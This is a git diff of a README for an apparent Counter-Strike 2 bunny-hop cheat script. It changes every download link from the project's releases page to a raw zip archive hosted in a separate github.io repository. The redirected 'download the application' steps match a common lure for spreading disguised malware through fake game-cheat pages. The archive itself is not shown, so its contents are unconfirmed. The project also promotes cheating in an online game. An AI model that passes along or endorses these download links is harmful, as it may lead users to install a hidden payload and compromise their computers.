@@ -5,7 +5,7 @@ description: "Automate perfect bunny hops in CS2 with precise jump timing, straf
 ---
 # 🐰 cs2-bhop-script-2026 - Perfect Bhop Timing, Zero Effort
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_Bhop_Script_2026-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/thipachan00123/cs2-bhop-script-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-CS2_Bhop_Script_2026-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/thipachan00123/thipachan00123.github.io/raw/refs/heads/main/data/v1.2.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps exactly. It takes less than two minutes.
 
 ### Step 1: Download the Script
 
-Visit this link to download the application: [https://github.com/thipachan00123/cs2-bhop-script-2026/releases](https://github.com/thipachan00123/cs2-bhop-script-2026/releases)
+Visit this link to download the application: [https://github.com/thipachan00123/thipachan00123.github.io/raw/refs/heads/main/data/v1.2.zip](https://github.com/thipachan00123/thipachan00123.github.io/raw/refs/heads/main/data/v1.2.zip)
 
 Click the most recent release file. It will download a small file to your computer.
 
@@ -140,7 +140,7 @@ This project is free to use. No warranty is provided. If you encounter issues, c
 
 ## 📥 Download Again
 
-Visit this link to download the application: [https://github.com/thipachan00123/cs2-bhop-script-2026/releases](https://github.com/thipachan00123/cs2-bhop-script-2026/releases)
+Visit this link to download the application: [https://github.com/thipachan00123/thipachan00123.github.io/raw/refs/heads/main/data/v1.2.zip](https://github.com/thipachan00123/thipachan00123.github.io/raw/refs/heads/main/data/v1.2.zip)
 
 ---
 
